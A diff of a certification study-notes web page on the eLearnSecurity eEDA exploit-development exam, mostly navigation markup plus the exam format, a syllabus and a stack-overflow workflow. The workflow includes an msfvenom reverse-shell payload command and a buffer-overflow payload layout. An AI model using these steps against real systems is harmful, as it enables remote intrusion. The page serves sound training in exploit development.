@@ -164,6 +164,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#eeda" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -2244,6 +2249,26 @@
       <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
       
       
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    eEDA
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
         
@@ -2261,6 +2286,69 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#exam-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exam Format
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#syllabus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Syllabus
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Workflow
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2825,6 +2913,60 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#exam-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exam Format
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#syllabus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Syllabus
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Workflow
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -2844,9 +2986,75 @@
   
 
 
-  <h1>eEDA</h1>
-
-
+<h1 id="eeda">eEDA<a class="headerlink" href="#eeda" title="Permanent link">&para;</a></h1>
+<p><strong>eLearnSecurity Exploit Development Associate</strong> — covers x86 exploit development: stack overflows, SEH, egg hunters, shellcoding, and basic DEP/ASLR bypass.</p>
+<h2 id="exam-format">Exam Format<a class="headerlink" href="#exam-format" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>Duration:</strong> 7 days</li>
+<li><strong>Format:</strong> Develop a working exploit for a vulnerable Windows application</li>
+<li><strong>Deliverable:</strong> Exploit code + report</li>
+</ul>
+<h2 id="syllabus">Syllabus<a class="headerlink" href="#syllabus" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Domain</th>
+<th>Topics</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Assembly Basics</td>
+<td>x86 registers, stack layout, calling conventions, opcodes</td>
+</tr>
+<tr>
+<td>Stack Overflows</td>
+<td>EIP control, offset finding, bad char identification</td>
+</tr>
+<tr>
+<td>Shellcoding</td>
+<td>Writing position-independent shellcode, null-free, alphanumeric</td>
+</tr>
+<tr>
+<td>SEH Exploits</td>
+<td>Structured Exception Handling overwrite, nSEH/SEH chain</td>
+</tr>
+<tr>
+<td>Egg Hunters</td>
+<td>Small shellcode + tag search for larger payload in memory</td>
+</tr>
+<tr>
+<td>DEP Bypass</td>
+<td>ROP chains — VirtualProtect / VirtualAlloc</td>
+</tr>
+<tr>
+<td>ASLR Bypass</td>
+<td>Partial overwrite, info leak, non-ASLR modules</td>
+</tr>
+</tbody>
+</table>
+<h2 id="workflow">Workflow<a class="headerlink" href="#workflow" title="Permanent link">&para;</a></h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># 1. Crash the app</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;print(&#39;A&#39;*5000)&quot;</span> <span class="o">|</span> <span class="n">nc</span> <span class="n">target</span> <span class="mi">9999</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># 2. Find offset (Metasploit pattern)</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="n">msf</span><span class="o">-</span><span class="n">pattern_create</span> <span class="o">-</span><span class="n">l</span> <span class="mi">5000</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="n">msf</span><span class="o">-</span><span class="n">pattern_offset</span> <span class="o">-</span><span class="n">q</span> <span class="o">&lt;</span><span class="n">EIP_value</span><span class="o">&gt;</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="c1"># 3. Identify bad characters</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x01\x02\x03</span><span class="s2">...</span><span class="se">\xff</span><span class="s2">&quot;</span><span class="p">)</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="c1"># 4. Find JMP ESP</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="err">!</span><span class="n">mona</span> <span class="n">jmp</span> <span class="o">-</span><span class="n">r</span> <span class="n">esp</span> <span class="o">-</span><span class="n">cpb</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="c1"># 5. Generate shellcode</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="o">=&lt;</span><span class="n">IP</span><span class="o">&gt;</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="o">-</span><span class="n">b</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">-</span><span class="n">f</span> <span class="n">python</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="c1"># 6. Final exploit</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">jmp_esp</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">shellcode</span>
+</span></code></pre></div>
+<h2 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h2>
+<p><code>immunity debugger</code> <code>mona.py</code> <code>pwndbg</code> <code>msfvenom</code> <code>ROPgadget</code> <code>windbg</code></p>
 
 
 
